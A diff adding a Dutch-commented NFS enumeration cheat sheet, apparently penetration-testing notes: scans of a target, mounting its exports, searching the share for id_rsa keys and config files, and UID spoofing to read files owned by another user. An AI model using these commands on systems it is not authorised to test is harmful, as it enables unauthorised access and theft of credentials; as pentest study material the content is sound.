@@ -1,0 +1,25 @@
+# NFS Enumeration en Mounting
+# === Ontdek NFS exports ===
+nmap -sV -p 111 --script=rpcinfo TARGET_IP
+nmap -p 111 --script nfs* TARGET_IP
+showmount -e TARGET_IP
+# === Mount NFS share ===
+mkdir /mnt/nfs
+mount -o nolock TARGET_IP:/share /mnt/nfs
+# Na gebruik unmounten:
+umount /mnt/nfs
+# === Mount met specifieke versie ===
+mount -t nfs -o vers=3,nolock TARGET_IP:/share /mnt/nfs
+mount -t nfs -o vers=2,nolock TARGET_IP:/share /mnt/nfs
+# === Bestanden bekijken ===
+ls -la /mnt/nfs/
+find /mnt/nfs/ -type f -name "*.txt" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null
+# === UID spoofing (als root_squash actief) ===
+# Als bestanden owned zijn door UID 1000:
+useradd -u 1000 fakeuser
+su fakeuser
+cat /mnt/nfs/secret.txt
+# === rpcinfo voor andere RPC services ===
+rpcinfo -p TARGET_IP
+# Tip: no_root_squash = root op client is root op server (gevaarlijk)
+# Tip: Check /etc/exports op de server voor configuratie
